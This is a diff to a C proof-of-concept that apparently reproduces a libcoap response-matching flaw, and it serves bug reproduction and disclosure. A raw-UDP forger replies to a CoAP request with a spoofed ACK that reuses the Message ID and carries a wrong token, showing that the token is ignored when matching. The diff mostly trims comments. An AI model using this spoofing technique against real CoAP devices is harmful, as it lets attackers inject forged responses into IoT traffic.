@@ -1,22 +1,4 @@
-/* Debug/teaching variant of token-spoof-repro.c — one binary, two cases, with
- * libcoap's internal DEBUG logging on so you can SEE the match happen.
- *
- * The client always sends a CON GET with token DE AD BE EF.
- * The raw-UDP forger answers with a piggybacked ACK (2.05). Two modes:
- *
- *   (default)        right MID, WRONG token (00000000)
- *                    => expect MATCH: "removed (1)" log + matched_request=YES.
- *                       Proves the token is IGNORED for matching.
- *
- *   FLIP_MID=1       WRONG MID (bits flipped), CORRECT token (DEADBEEF)
- *                    => expect NO MATCH: no "removed" log, matched_request=no,
- *                       and the CON keeps retransmitting. Proves the MID is the
- *                       sole match key — the correct token does NOT rescue it.
- *
- *   build: make token-spoof-repro-dbg
- *   run:   ./token-spoof-repro-dbg            # match case
- *          FLIP_MID=1 ./token-spoof-repro-dbg # no-match case
- */
+/* Debug variant of token-spoof-repro.c with DEBUG logging; FLIP_MID=1 flips the reverse case. */
 #define _DEFAULT_SOURCE
 #include <arpa/inet.h>
 #include <sys/wait.h>
@@ -40,20 +22,18 @@ static void forger(int flip_mid) {
   socklen_t len = sizeof(cli);
   recvfrom(fd, in, sizeof(in), 0, (struct sockaddr *)&cli, &len);
 
-  /* in[2],in[3] = the request's Message ID. Flip both bytes for the no-match
-   * case (guaranteed != the request MID); reuse verbatim for the match case. */
+  /* match case: reuse MID; flip_mid: flip MID (!= request MID). */
   uint8_t mid_hi = flip_mid ? (uint8_t)(in[2] ^ 0xFF) : in[2];
   uint8_t mid_lo = flip_mid ? (uint8_t)(in[3] ^ 0xFF) : in[3];
 
-  /* match case: wrong token (00..). no-match case: the CORRECT token, to prove
-   * a right token still cannot rescue a wrong MID. */
+  /* match case: wrong token; flip_mid: correct token (still shouldn't rescue). */
   uint8_t tok0 = flip_mid ? 0xDE : 0x00, tok1 = flip_mid ? 0xAD : 0x00;
   uint8_t tok2 = flip_mid ? 0xBE : 0x00, tok3 = flip_mid ? 0xEF : 0x00;
 
   uint8_t ack[] = {
-      0x64,             /* ver=1, type=ACK, TKL=4                 */
-      0x45,             /* 2.05 Content (piggybacked)             */
-      mid_hi, mid_lo,   /* Message ID (reused or flipped)         */
+      0x64,             /* ver 1, ACK, TKL 4 */
+      0x45,             /* 2.05 Content */
+      mid_hi, mid_lo,
       tok0, tok1, tok2, tok3,
       0xFF, 's', 'p', 'o', 'o', 'f'
   };
@@ -88,7 +68,7 @@ int main(void) {
   usleep(200 * 1000);
 
   coap_startup();
-  coap_set_log_level(COAP_LOG_DEBUG);   /* <-- shows "added/removed" queue lines */
+  coap_set_log_level(COAP_LOG_DEBUG);
 
   coap_context_t *ctx = coap_new_context(NULL);
   coap_address_t dst;
